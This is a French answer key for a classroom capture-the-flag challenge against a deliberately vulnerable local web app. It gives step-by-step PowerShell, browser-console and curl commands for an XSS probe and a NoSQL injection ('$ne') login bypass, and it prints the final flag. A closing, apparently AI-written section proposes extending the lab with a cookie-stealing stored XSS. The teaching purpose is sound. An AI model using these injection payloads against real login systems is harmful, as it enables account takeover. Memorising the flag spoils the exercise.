# CTF Vol 404 - Solutions

Ce document donne deux parcours complets:

1. Parcours A: terminal PowerShell (rapide pour corriger et verifier)
2. Parcours B: navigateur (plus pedagogique pour les etudiants)

---

## Prerequis

1. L'app est lancee sur http://localhost:3000
2. MongoDB est disponible (Docker compose ou local)
3. Le seed a ete execute

Commandes utiles:

```powershell
docker compose up -d --build
npm run seed
```

---

## Parcours A - Solution PowerShell complete

### 1) Verifier les passagers

```powershell
(Invoke-RestMethod -Uri 'http://localhost:3000/billets/passengers').Count
```

### 2) Creer une session HTTP (cookies)

```powershell
$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
```

### 3) Condition XSS (premiere etape)

```powershell
$xss = @{ username = '<img src=x onerror=alert(1)>'; password = 'wrong' } | ConvertTo-Json -Depth 4
try {
  Invoke-RestMethod -Uri 'http://localhost:3000/auth/login' -Method Post -ContentType 'application/json' -WebSession $session -Body $xss
} catch {}
```

### 4) Condition NoSQL (deuxieme etape)

```powershell
$nosql = @{ username = 'alice'; password = @{ '$ne' = '' } } | ConvertTo-Json -Depth 4
Invoke-RestMethod -Uri 'http://localhost:3000/auth/login' -Method Post -ContentType 'application/json' -WebSession $session -Body $nosql
```

### 5) Verifier les logs admin

```powershell
Invoke-RestMethod -Uri 'http://localhost:3000/auth/logs' -WebSession $session
```

### 6) Charger le billet (QR obligatoire)

```powershell
$ticket = Invoke-RestMethod -Uri 'http://localhost:3000/billets/my' -WebSession $session
$ticket | Format-List
```

Important:

1. Le QR doit etre scanne depuis `billet.html`
2. Le scan ouvre `/gate/scan/<scanId>` sur le telephone
3. Le PC est redirige automatiquement vers `/gate/scan-result/<scanId>`

### 7) Soumettre le code final

```powershell
$flag = Invoke-RestMethod -Uri 'http://localhost:3000/flag' -Method Post -ContentType 'application/json' -WebSession $session -Body (@{ code = 94 } | ConvertTo-Json)
$flag
```

Resultat attendu:

```text
CTF{ORY_boarding_complete}
```

---






## Parcours B - Solution navigateur (sans PowerShell)

### 1) Reperer la cible

1. Ouvrir http://localhost:3000
2. Afficher le code source (Ctrl+U)
3. Trouver la route cachee `passengers.html`
4. Ouvrir http://localhost:3000/passengers.html
5. Identifier la cible `alice`

### 2) Valider la condition XSS

1. Ouvrir http://localhost:3000/login.html
2. Tester dans le formulaire:

```text
username = <img src=x onerror=alert(1)> // <script>alert('XSS-SCRIPT')</script>
password = nimportequoi
```

### 3) Valider la condition NoSQL (DevTools)

Dans la console navigateur sur `login.html`:

```javascript
fetch('/auth/login', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  credentials: 'include',
  body: JSON.stringify({
    username: 'alice',
    password: { $ne: '' }
  })
})
  .then(r => r.json())
  .then(console.log);
```

Le front appelle déjà la route dans le code de la page login: login.html
En soumettant le formulaire, DevTools Network affiche directement la requête POST vers /auth/login.
En échec de login, le backend renvoie un hint sur le préfixe /auth/: authController.js

### 4) Verifier les logs admin

Ouvrir:

```text
http://localhost:3000/auth/logs
```

### 5) Etape QR obligatoire

1. Ouvrir http://localhost:3000/billet.html
2. Scanner le QR avec le telephone
3. Le telephone ouvre le JSON gate
4. Le PC est redirige automatiquement vers le gate JSON

Le JSON gate ressemble a:

```json
{"gate":"B7","flightCode":"AF404","message":"RVN","hint":"QTH Locator : JN18ER","indice":"La cle survole la banlieue parisienne..."}
```

### 6) Envoyer le code final depuis le navigateur

Dans DevTools Console:

```javascript
fetch('/flag', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  credentials: 'include',
  body: JSON.stringify({ code: 94 })
})
  .then(r => r.json())
  .then(console.log);
```


Postman possible 

Curl possible : 

curl -c cookies.txt -H "Content-Type: application/json" \
  -d "{\"username\":\"alice\",\"password\":{\"$ne\":\"\"}}" \
  http://localhost:3000/auth/login

curl -b cookies.txt -H "Content-Type: application/json" \
  -d "{\"code\":94}" \
  http://localhost:3000/flag

Resultat attendu:

```text
CTF{ORY_boarding_complete}
```

---

## Notes prof (anti blocage rapide)

1. Si le scan ouvre `localhost` sur telephone: verifier `PUBLIC_BASE_URL` dans `.env`
2. Si le telephone ne charge pas l'URL LAN: verifier meme Wi-Fi + firewall Windows port 3000
3. Si le QR ne debloque pas le PC: recharger `billet.html` pour regenerer un QR (nouveau `scanId`)
4. Si la session expire: refaire login puis reprendre a l'etape billet



## idée possible pour finir le storytelling
on pourrait faire de la gestion de token avec un truc en mode ils ont telle temps pour pouvoir le valider et pour récuperer le token il devraient faire du fishing


réponses IA : 
Ce qui est pédagogiquement fort :

XSS → phishing est une vraie chaîne d'attaque réaliste (OWASP A3/A7)
Vous avez déjà la condition XSS dans le CTF (step 3), mais elle ne fait que alert(1). La rendre fonctionnelle (vol de token) c'est l'étape logique suivante
Le time limit ajoute de la pression et simule un vrai scénario
Le gros problème technique :
Pour simuler une victime qui "clique" sur le lien de phishing, il faut soit :

Un bot headless (Puppeteer) qui visite l'URL soumise → complexe, ressources Docker
Un endpoint serveur qui simule le clic côté backend → plus simple mais moins réaliste
Un vrai complice (le prof joue la victime manuellement) → pédagogique mais fragile en conditions réelles
Sans ça, les étudiants soumettent un lien... dans le vide. Ça ne fonctionne pas.

Une version réaliste et faisable pour votre stack :

Une route /admin/review — le "modérateur" visite automatiquement les billets signalés toutes les 30s (cron job serveur, pas de headless browser)
Le stored XSS sur le champ username (déjà en place) exfiltre le cookie/token du modérateur vers une URL contrôlée par l'étudiant
Le token récupéré est à usage unique avec TTL de 5 minutes
Ce token donne accès à /cockpit
C'est faisable sans Puppeteer — le serveur simule lui-même la "visite" du modérateur en executant le payload XSS côté serveur via un parser HTML minimaliste.

